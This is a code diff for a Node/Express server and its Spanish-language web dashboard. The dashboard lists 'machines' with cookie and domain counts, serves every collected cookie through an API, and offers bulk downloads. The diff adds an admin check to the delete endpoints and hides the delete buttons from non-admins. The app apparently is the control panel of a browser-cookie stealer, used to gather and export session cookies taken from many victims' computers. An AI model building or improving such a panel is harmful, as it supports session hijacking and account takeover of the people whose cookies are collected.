@@ -171,8 +171,16 @@ app.get("/api/cookies", (req, res) => {
   res.json({ cookies: all, total: all.length });
 });
 
-// ── Delete a machine ──
+// ── Admin check helper ──
+function isAdmin(req) {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  const s = sessions.get(token);
+  return s?.user === ADMIN_USER;
+}
+
+// ── Delete a machine (admin only) ──
 app.delete("/api/machines/:machineId", (req, res) => {
+  if (!isAdmin(req)) return res.status(403).json({ error: "admin only" });
   const safeId = req.params.machineId.replace(/[^a-zA-Z0-9_-]/g, "_");
   const filePath = path.join(DATA_DIR, safeId + ".json");
   if (!fs.existsSync(filePath)) return res.status(404).json({ error: "not found" });
@@ -181,8 +189,9 @@ app.delete("/api/machines/:machineId", (req, res) => {
   res.json({ ok: true, deleted: safeId });
 });
 
-// ── Delete ALL machines ──
+// ── Delete ALL machines (admin only) ──
 app.delete("/api/machines", (req, res) => {
+  if (!isAdmin(req)) return res.status(403).json({ error: "admin only" });
   const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
   for (const f of files) fs.unlinkSync(path.join(DATA_DIR, f));
   console.log(`[-] Deleted all: ${files.length} machines`);
@@ -348,7 +357,7 @@ button:hover{background:#30363d}
   <button class="btn-blue" onclick="downloadFiltered('txt')">⬇ .txt</button>
   <button class="btn-blue" onclick="downloadFiltered('json')">⬇ .json</button>
   <button class="btn-green" onclick="refresh()">⟳ Actualizar</button>
-  <button class="btn-red" onclick="deleteAll()">🗑 Borrar todo</button>
+  <button class="btn-red" onclick="deleteAll()" id="btn-delete-all" style="display:none">🗑 Borrar todo</button>
 </div>
 <div class="container" id="tab-machines"></div>
 <div class="container hidden" id="tab-cookies"></div>
@@ -356,7 +365,7 @@ button:hover{background:#30363d}
 <div id="toast"></div>
 
 <script>
-let MACHINES=[], ALL_COOKIES=[], currentTab="machines";
+let MACHINES=[], ALL_COOKIES=[], currentTab="machines", IS_ADMIN=false;
 
 async function fetchMachines(){const r=await fetch("/api/machines");if(r.status===401)return location.href="/login";MACHINES=await r.json();const sel=document.getElementById("machine-filter");const prev=sel.value;sel.innerHTML='<option value="all">Todas las máquinas</option>';for(const m of MACHINES)sel.innerHTML+='<option value="'+esc(m.machineId)+'">'+esc(m.machineId)+'</option>';sel.value=prev||"all"}
 async function fetchAllCookies(){const r=await fetch("/api/cookies");if(r.status===401)return location.href="/login";const d=await r.json();ALL_COOKIES=d.cookies}
@@ -393,7 +402,7 @@ function renderMachines(){
     html+='<div class="machine-stats">';
     html+='<div class="stat"><div class="n">'+m.cookieCount+'</div><div class="l">cookies</div></div>';
     html+='<div class="stat"><div class="n">'+m.domainCount+'</div><div class="l">dominios</div></div>';
-    html+='<div style="margin-left:12px"><button class="btn-red btn-sm" onclick="deleteMachine(\\''+esc(m.machineId)+'\\')">🗑</button></div>';
+    html+='<div style="margin-left:12px">'+(IS_ADMIN?'<button class="btn-red btn-sm" onclick="deleteMachine(\\''+esc(m.machineId)+'\\')">🗑</button>':'')+'</div>';
     html+='</div></div>';
   }
   el.innerHTML=html;
@@ -455,7 +464,11 @@ document.getElementById("machine-filter").addEventListener("change",()=>render()
 async function checkAdmin(){
   const r=await fetch("/api/me");
   const d=await r.json();
-  if(d.isAdmin)document.getElementById("admin-tab").style.display="";
+  IS_ADMIN=d.isAdmin;
+  if(d.isAdmin){
+    document.getElementById("admin-tab").style.display="";
+    document.getElementById("btn-delete-all").style.display="";
+  }
 }
 
 async function renderAdmin(){
